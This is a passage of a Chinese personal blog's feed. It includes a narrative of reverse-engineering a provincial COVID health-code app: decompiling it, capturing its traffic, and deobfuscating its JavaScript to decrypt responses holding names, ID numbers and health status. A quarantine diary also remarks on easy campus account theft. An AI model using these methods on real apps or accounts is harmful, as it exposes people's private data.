    <content type="html"><![CDATA[<p>2/13<br />但是还是觉得自己菜得要死<br /><a href="https://shimo.im/docs/Gt8GCcQ6rQ3vJxh6">福建省第二届&quot;闽盾杯&quot;网络空间安全大赛黑盾赛道WP</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;2/13&lt;br /&gt;
但是还是觉得自己菜得要死&lt;br /&gt;
&lt;a href=&quot;https://shimo.im/docs/Gt8GCcQ6rQ3vJxh6&quot;&gt;福建省第二届&amp;quot;闽盾杯&amp;quot;网络空间安全大赛黑盾赛道WP&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="Windows" scheme="https://yoloyolo.top/tags/Windows/"/>
    
    <category term="Cyber_Attribution" scheme="https://yoloyolo.top/tags/Cyber-Attribution/"/>
    
  </entry>
  
  <entry>
    <title>X闽健康码分析</title>
    <link href="https://yoloyolo.top/2021/11/15/X-Min-Health-Code/"/>
    <id>https://yoloyolo.top/2021/11/15/X-Min-Health-Code/</id>
    <published>2021-11-15T14:35:58.000Z</published>
    <updated>2023-07-16T08:58:35.423Z</updated>
    
    <content type="html"><![CDATA[<p>属于是白忙活了，但没完全白忙活</p><a id="more"></a><p>起因是某个选修课的老师觉得我这个识别口罩自动开关门的项目太简单了，事实上我也觉得很简单，甚至自动开关门我都想用只一个被驱动的异步电机糊弄过去<br />后来想着加点活，然后想到了去医院体检的时候，医院门口的门禁是识别口罩+扫X闽健康码<br />所以就想着可能X闽健康码的内容应该挺好解析的<br />截图后丢直接微信扫一扫，和我想得一模一样的Base64编码<br />传到电脑上解码的时候蚌埠住了，估计是加密了，格式如下<br />“MZTJKM_” + 236字节Base64编码 + “#|” + 精确到毫秒的Unix时间戳<br />所以就想着去把中间的Base64解出来<br />然后凭着上次且仅一次的三个月前渗透APP的模糊记忆<br />打开jadx，先看看有没有双向认证，很庆幸是&quot;零向认证&quot;<br />搜索关键字&quot;AES&quot;，然后找了半天的密钥<br />换了&quot;CBC&quot;搜索，然后还找到了3DES的算法<br />感觉不对劲了<br />想办法抓手机APP的包，一通瞎摁点出了个请求X闽健康码的HTTP请求，虽说后面再也没摁出来过了<br />然后我拿着HTTP请求的URL回jadx接着搜索，然后浪费了一个小时<br />后来我才想到，这APP就是个壳子罢了<br />二维码的内容实际上还是Server给的<br />而且请求的URL不在APP里面而是在HTML页面里<br />然后开F12看JS去了，属实是有点坐牢<br />看到后面看到了个&quot;decrypt&quot;的字样，感觉有戏<br />跟进之后就是混淆的JS，此时感觉差不多寄了<br />先把JS反混淆一下大概看看<br />然后把混淆的代码丢console里，挨个跑被混淆的解密参数<br />然后从之前X闽健康码HTTP响应的json里扒拉出来data<br />解密之后得到了姓名，身份证号，健康状态，还有二维码的文本形式（没有后面的时间戳，时间戳是js另外加的）等<br />挺有意思都，新生杯密码学压轴就出这个了<br />到头来X闽健康码的内容还是不知道咋解析<br />回头想想去医院扫健康码的过程<br />要么是医院的门禁内置了X闽健康码的解密函数，能进一步提取里面的信息<br />要么那玩意就提取二维码的文本后匹配&quot;^MZTJKM_[0-9a-zA-Z+/=]{236}#|[0-9]{13}$&quot;<br />但是要是有人拿个红码能进去吗，应该不行<br />所以可能扫码有个颜色识别，这个我就不会了</p><hr /><p>后来又分析了下<br />16字节的分组加密，分组加密方式是ECB<br />我一开始以为应该是AES，后来跟老师讨论的时候说这种政府的项目应该是国密SM4之类的<br />根据我的猜测，中间存在一段在固定位置变动的22字节Base64编码，换算下来解码后正好差不多16字节<br />HTTP响应里也有个12字节的response_code会变动,所以这部分一直变动的16字节大概率是对应response_code<br />剩下4字节可以枚举，但是存在5种位置分布的情况<br />差不多(96 ** 4) * 5种可能<br />而且就算枚举出了全部的可能，也没办法通过明文与密文来还原出密钥，爆破16字节的密钥更不可能了，得爆破(256 ** 16) * (96 ** 4) * 5次，能爆破出来(96 ** 4) * 5个密钥，而且其中只有一个是对的<br />除非我有台量子计算机<br />也还有种可能，就是跟省人民政府去谈项目，但是没这个路子<br />总结来说就是，寄</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;属于是白忙活了，但没完全白忙活&lt;/p&gt;</summary>
    
    
    
    <category term="Talk" scheme="https://yoloyolo.top/categories/Talk/"/>
    
    
    <category term="Unbengable" scheme="https://yoloyolo.top/tags/Unbengable/"/>
    
  </entry>
  
  <entry>
    <title>蚌埠的一天</title>
    <link href="https://yoloyolo.top/2021/09/17/Unbengable-Day/"/>
    <id>https://yoloyolo.top/2021/09/17/Unbengable-Day/</id>
    <published>2021-09-17T14:31:18.000Z</published>
    <updated>2023-07-16T08:58:51.183Z</updated>
    
    <content type="html"><![CDATA[<p>2021.09.16<br />根据真实事件改编，如有雷同，请务必对号入座</p><a id="more"></a><p>因为疫情的原因，学校改为上网课<br />早八是一节线上实践课，课程主题是物联网安全<br />07:59的闹钟响了<br />连接腾讯会议之后便半睡半醒地听课<br />这个课是第一次上<br />确切来说是从第一周开始，但是第一周的课因为&quot;机房装修&quot;所以&quot;暂时不上&quot;，通知时间是08:32，距离上课时间过去了32分钟<br />第二周的课因为&quot;还没有开始&quot;所以也不上了，通知时间是00:43<br />然后老师开始说有哪些课程方向可以选</p><ol><li>物联网设备隐私检测</li><li>指纹伪造</li><li>浏览器指纹</li><li>隐写</li><li>加密</li><li>取证</li><li>APP隐私检测</li><li>身份伪装</li></ol><p>我寻思了一下<br />我把上学期写得烂尾Beacon隐写改改得了<br />然后就继续半睡半醒地听课了<br />蚌埠住了</p><p>后来一直不知道说啥玩意，他给的参考文档可能涉及内容敏感，所以会发一个加密的压缩包，然后再发一个密码<br />我觉得他有点在脱裤子放屁<br />然后他说让我们不要乱传这些文件，以防止触发审查机制带来不必要的麻烦<br />我寻思你不整点政治敏感监管人员都懒得看你一眼<br />然后发了个四川大学学生被通报用校园网浏览色情网站27次的截图，然后补了一句&quot;每个学校的校园网都有这个审查机制&quot;<br />我不知道他是在威慑我们还是他想说校园网有监管机制<br />我寻思这种东西开个代理不就没这么多事了<br />退一步来讲，学校的校园网弱口令泛滥得不想说了，盗用账号的收益/(成本*风险)比率可以说是要多高有多高了<br />然后说如果触发了审查机制与他无关<br />我顿时顿悟了，他之前所说一切的可能只是在为这一步做铺垫<br />蚌埠住了</p><p>扯东扯西扯到了九点半就不扯了<br />我能感觉到他之前的内容在尽力地拖时长，可能是因为这节课按照教学计划是要上到11:30<br />但是他真的尽力了，实在不知道扯啥了，所以让我们退出腾讯会议<br />蚌埠住了</p><p>然后我就开始上网冲浪<br />某女纪委被人爆出打女拳&amp;非法获利<br />八小时后就出了自检通告<br />自罚三杯不了了之<br />热心网友向督导组邮想投递邮件叙述情况被拒收<br />反而N**游戏社区接到电话被警告<br />“总不能什么都查吧，没准会查出什么来呢”<br />互联网真的太精彩辣<br />蚌埠住了</p><p>我上网冲浪完后室友回来说辅导员叫我去隔离<br />我问真的假的<br />他说真的<br />为什么要隔离呢<br />因为部门那边有个同事跟一个确诊的坐高铁同一排上<br />然后上周四部门吃饭博饼<br />我也不知道那个同事是谁，当时饭局的二十几桌<br />可能我在这头，他在那头<br />然后我就被算是次密接了<br />一桌的还在上班，不一桌的已经准备隔离了<br />蚌埠住了</p><p>辅导员在哪呢<br />疫情爆发的当晚就回同安看老婆去了<br />其他老师说让他住寝室，但是拉都拉不住<br />可能是因为到了第二天封校了<br />然后可能他那天就在家里跟我们开年级大会<br />强调我们学校不是封校，是非必要不外出<br />这已经是我第二次听了<br />然后过两天同安就封了<br />辅导员仍然坚持居家办公<br />这种精神我觉得值得我们学习<br />蚌埠住了</p><p>然后我就开始收拾东西准备隔离了<br />拉着行李箱去找楼管办外出手续<br />她问我干嘛<br />我说隔离<br />她摆在桌上的双臂下意识得往回收了下<br />填完手续就提着行李去隔离了<br />蚌埠住了</p><p>我们当天一共去了五个人吃饭，所以五个人一起隔离<br />我对辅导员得知公司那边的消息延迟持有怀疑态度<br />如果真是公司有跟学校沟通就不会疫情爆发了三天再叫我们去隔离<br />然后我们开始查内鬼<br />然后就内鬼自爆了<br />因为她的舍友一直叫她跟辅导员自爆<br />然后她今天就去跟辅导员自爆了<br />然后我们都被拉过来隔离了<br />我觉得她舍友如此为疫情防控着想，她应该也过来隔离，毕竟她算是密接的密接的密接了<br />我寻思核酸都有做过了，给我整得有点不会了<br />蚌埠住了</p><p>然后我们五个人在酒店门口站了十几分钟<br />我们与酒店有一个玻璃门相隔，这头是三十多度的日头，那头是二十六度的空调<br />但是保安不让进，支支吾吾得说要找对接医生<br />送我们隔离的老师就去打电话找对接医生<br />然后开始了经典的踢皮球<br />踢了十分钟就踢完了<br />我们登记之后领了房卡就进去了<br />保安不让我们用电梯<br />然后我们搬着行李走楼梯上了三楼<br />这可能是我一生中唯一一次走楼梯入住酒店了<br />蚌埠住了</p><p>到了房间之后插卡取电<br />我发现取电方式是传统的插卡取电<br />然后我就把我的学生卡插进去了<br />房间没有晾衣服的地方<br />我就把带的垃圾袋系成一根绳子<br />两端绑在阳台扶手跟水管<br />然后我就能晾衣服了<br />我也不知道我要隔离多久<br />可能七天，可能十四天，可能无期<br />反正免费的单间还是挺香的<br />蚌埠住了</p><p>然后我就去上厕所了<br />厕所里摆的是马桶<br />按照习惯，先拿卫生纸擦两遍，然后把纸丢马桶里防止溅水花<br />然后马桶就堵住了<br />可能是这个马桶的口径不太行<br />把水加到八成满还是没用<br />然后我就去打电话问前台能不能帮忙疏通马桶<br />前台支支吾吾得说现在疫情的情况不是很方便<br />然后我问能不能把马桶抽子放在我的门口，我自己抽两下子<br />然后前台支支吾吾得说去问一下<br />我就把之前洗热水壶烧的水倒进马桶<br />然后摁一下冲水，就通了<br />然后门铃响了，一个马桶抽子摆在门口<br />虽然我现在不需要这个马桶抽子<br />但是这个马桶抽子能给我带来无穷无尽的安全感<br />蚌埠住了</p><p>然后我就去洗澡了<br />浴室的玻璃门是透明的，我不知道这样的用意是什么<br />然后玻璃门的导轨有点歪，拉动后会向左边滑动<br />我觉得可能是浴室的地板可能歪得有点离谱了<br />蚌埠住了</p><p>然后有医务人员来做核酸检查<br />然后叫我扫一个二维码预约一下<br />我进入那个小程序的方式有点不对<br />让我选一个预约时间<br />然后小程序里选不了预约时间<br />然后必须要有预约时间才能提交这个预约<br />医务人员看着我弄了三四遍就说要我加他微信<br />叫我自己慢慢玩<br />预约上了把结果发给他<br />但是那个小程序我直接进去是要付费预约的<br />扫他给的码不用付费<br />所以我叫他把码再发一下<br />然后我就预约上了<br />通过控制变量法，我觉得可以证明是他的问题<br />蚌埠住了</p><p>然后我就去订餐群订餐了<br />有口水鸡套餐，红烧肉套餐，稀饭套餐<br />都是学校食堂打包过来的<br />价格都是12块<br />应该都是一荤二素<br />我五点半预约的饭<br />快七点才送到<br />我寻思这属实有点久了<br />然后就开始吃饭了<br />吃完饭我寻思一下发现垃圾袋不够用<br />房间里除了套垃圾桶上的也有没有多余垃圾袋<br />但是总是要丢垃圾的<br />所以我把垃圾丢盒饭的袋子里<br />然后把袋子丢门口了<br />蚌埠住了</p><p>然后我就开始打dota了<br />我在上高的时候跟我一起隔离的室友给我打电话叫我填一个隔离备案记录<br />我说叫他等下<br />我在破第二路高地的时候他又给我打电话了<br />我说马上打完<br />打完之后我去填那个隔离备案记录<br />然后我不知道该怎么填<br />我填得差不多了去问他是不是这样填<br />他说他帮我填好了<br />我说<br />谢谢<br />祝您生活愉快<br />再见<br />蚌埠住了</p><p>然后我后面在选人的时候又有华大的老师来打电话给我说<br />问我是因为什么被隔离的<br />我说次密接<br />他问我有没有接到防疫中心的电话<br />我说没有，是辅导员叫我隔离的<br />然后问了我一堆东西<br />我不是很清楚他要问的东西，而且我不是很想退掉这把dota<br />然后我就把我舍友的名字报给他了，叫他联系我舍友去了<br />然后我就继续dota了<br />然后我就感觉这次隔离可能就是因为有sb在瞎jb搞，是谁我不说<br />然后几个一起隔离的都跟我说可能明天就要解除隔离了<br />属于是白嫖了一个单间的钱<br />蚌埠住了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2021.09.16&lt;br /&gt;
根据真实事件改编，如有雷同，请务必对号入座&lt;/p&gt;</summary>
    
    
    
    <category term="Talk" scheme="https://yoloyolo.top/categories/Talk/"/>
    
    
    <category term="Unbengable" scheme="https://yoloyolo.top/tags/Unbengable/"/>
    
  </entry>
  
</feed>
